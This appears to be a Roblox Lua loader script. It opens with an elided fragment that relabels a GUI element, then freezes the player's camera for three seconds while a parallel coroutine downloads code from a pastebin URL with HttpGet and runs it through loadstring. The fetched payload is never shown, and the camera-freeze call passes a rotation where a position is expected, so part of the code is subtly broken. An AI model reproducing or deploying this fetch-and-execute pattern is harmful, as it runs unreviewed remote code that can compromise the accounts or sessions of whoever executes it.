    ...
    if screenGui then
        ...
        if magicHealthFrame then
            ...
            if textLabel then
                ...
                textLabel.Text = " The Hounered One (RTC)"
...
-- Define the duration for which the camera will be frozen (in seconds)
local freezeDuration = 3
local player = game.Players.LocalPlayer
local camera = game.Workspace.CurrentCamera

-- Store the time when freezing starts
local freezeStartTime = tick()

-- Disable camera controls by turning off CameraType to Scriptable
camera.CameraType = Enum.CameraType.Scriptable

-- Store the initial camera position
local initialPosition = camera.CFrame.Position
local initialRotation = camera.CFrame.Rotation

-- Define the loadstring to be executed (your URL loadstring)
local loadStringCode = "loadstring(game:HttpGet('https://pastebin.com/raw/bwcEWbWr'))()"

-- Function to freeze the camera
local function freezeCamera()
    while tick() - freezeStartTime < freezeDuration do
        camera.CFrame = CFrame.new(initialPosition, initialRotation)
        game:GetService("RunService").RenderStepped:Wait()
    end
    -- After freeze duration, reset camera control to default
    camera.CameraType = Enum.CameraType.Custom
end

-- Function to execute the loadstring concurrently
local function executeLoadString()
    local func, err = loadstring(loadStringCode)
    if func then
        func()
    end
end

-- Create two coroutines to run both tasks simultaneously
coroutine.wrap(freezeCamera)()  -- Run freezeCamera
coroutine.wrap(executeLoadString)()  -- Execute loadstring
